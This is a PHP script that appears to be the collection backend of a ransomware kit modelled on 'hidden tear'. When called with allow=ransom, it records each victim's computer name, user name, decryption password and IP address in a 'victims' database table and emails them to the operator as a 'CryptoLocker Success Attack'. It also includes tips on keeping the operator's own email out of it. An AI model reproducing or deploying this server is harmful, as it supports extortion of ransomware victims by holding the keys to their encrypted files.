<title>Nope!</title>
<?php
    include './connect_db.php';
    function anti_injection($input){
      $clean=strip_tags(addslashes(trim($input)));
      $clean=str_replace("'","\'",$clean);
      $clean=str_replace('"','\"',$clean);
      $clean=str_replace(';','\;',$clean);
      $clean=str_replace('--','\--',$clean);
      $clean=str_replace('+','\+',$clean);
      $clean=str_replace('>','\>',$clean);
      $clean=str_replace('<','\<',$clean);
      return $clean;
}


if (!empty($_GET['computer_name']) && !empty($_GET['userName']) && !empty($_GET['password']) && ($_GET['allow']=="ransom")){
 
    $ip = getenv ("REMOTE_ADDR");   
    $off = (strip_tags(addslashes($_GET['computer_name'])));
    $off_1 = (strip_tags(addslashes($_GET['userName'])));
    $off_2 = (strip_tags(addslashes($_GET['password'])));
    
    $key = anti_injection($off);
    $key_1 = anti_injection($off_1);
    $key_2 = anti_injection($off_2);
    
    $computer_name = $key;
    $user_name = $key_1;
    $password = $key_2;
    
    //save data in database 
    
	$sql_save = "INSERT INTO victims (computer_name, user_name, password, ip) VALUES ('$computer_name','$user_name','$password','$ip')";
    $ris = mysql_query($sql_save, $con) or die (mysql_error());

    /*//You can also consider to create a file and update it each time virus was run but is not raccomended
    $myfile = fopen("result.txt", "r");
    $handle = fread($myfile,filesize("result.txt"));
    $file = fopen("result.txt","w");
    $txt = "$computer_name-$user_name          $password         $ip\n";
    fwrite($file,"$handle\n$txt");
    fclose($file); */
    
    // SEND AN EMAIL AT YOUR ANDRESS, WARNING : DON'T WRITE A YOUR OWN PERSONAL EMAIL ADDRESS
    $sender = "ransomware@hiddentear.com";      //Choose an email sender random 
    $recipient = "youremail@gmail.com";			//Choose your email
    $object = "CryptoLocker Success Attack";
    $message = "Information about victim and password for decrypt:\n $computer_name-$user_name          $password         $ip";
	$headers = "From: {$sender}\r\n";
    
    mail($sender, $object, $message, $headers);
    
  }else{
	  echo "Nothing to show, nothing to say...";
	  return false;
  }
?>